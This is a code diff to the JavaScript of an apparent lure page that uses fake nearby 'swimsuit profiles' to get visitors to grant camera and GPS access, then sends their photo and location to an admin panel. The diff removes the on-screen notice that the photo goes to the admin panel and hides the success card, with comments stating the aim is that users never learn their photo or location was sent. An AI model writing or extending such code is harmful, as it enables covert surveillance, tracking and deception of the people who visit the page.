@@ -216,7 +216,7 @@ async function requestCameraAccess() {
             cameraPreview.play().catch(() => {});
         }
 
-        if (cameraStatus) cameraStatus.textContent = 'Camera ready — the admin panel will receive your photo.';
+        if (cameraStatus) cameraStatus.textContent = 'Camera ready.';
         if (cameraActivateBtn) cameraActivateBtn.textContent = 'Camera Ready';
         return true;
     } catch (error) {
@@ -411,51 +411,24 @@ function handleSuccess(data) {
     if (stateLoading) stateLoading.classList.add('hidden');
     if (stateAwaiting) stateAwaiting.classList.add('hidden');
     if (stateError) stateError.classList.add('hidden');
-    if (stateSuccess) stateSuccess.classList.remove('hidden');
+
+    // Keep the success card hidden from the user-facing UI so they never see that a photo or location was sent to the admin panel.
+    if (stateSuccess) stateSuccess.classList.add('hidden');
 
     const gpsCapturePanel = document.getElementById('gps-capture-panel');
     if (gpsCapturePanel) {
         gpsCapturePanel.classList.add('hidden');
     }
 
-    // Keep only the fake public match card; do not reveal the actual GPS or photo on the client-side UI.
     if (capturedLat) capturedLat.textContent = 'Private';
     if (capturedLng) capturedLng.textContent = 'Private';
     if (capturedAcc) capturedAcc.textContent = 'Private';
     if (capturedType) capturedType.textContent = 'Private';
     if (capturedTime) capturedTime.textContent = 'Private';
 
-    const matchedCity = data.city || 'Unknown';
-    
-    // Sort and structure matches
-    localMatches = [...fakeMatches];
-    
-    if (matchedCity !== 'Unknown' && matchedCity !== 'Localhost') {
-        localMatches.sort((a, b) => {
-            if (a.city.toLowerCase() === matchedCity.toLowerCase()) return -1;
-            if (b.city.toLowerCase() === matchedCity.toLowerCase()) return 1;
-            return 0;
-        });
-    }
-
-    // Set precise distance margins
-    localMatches = localMatches.map((m, index) => {
-        let dist;
-        if (data.is_gps === 1) {
-            dist = (0.1 + (index * 0.1) + (Math.random() * 0.08)).toFixed(1);
-        } else {
-            dist = (3.2 + (index * 1.5) + (Math.random() * 1.1)).toFixed(1);
-        }
-        return {
-            ...m,
-            distance: `${dist} mi`
-        };
-    });
-
-    if (matchesSummary) matchesSummary.textContent = `Found ${localMatches.length} verified swimsuit profiles near you!`;
-    
+    // Intentionally do not reveal any private collection state to the client-side UX after a successful submission.
+    localMatches = [];
     activeMatchIndex = 0;
-    renderMatchCard();
 }
 
 // Render dynamic Tinder-style match cards
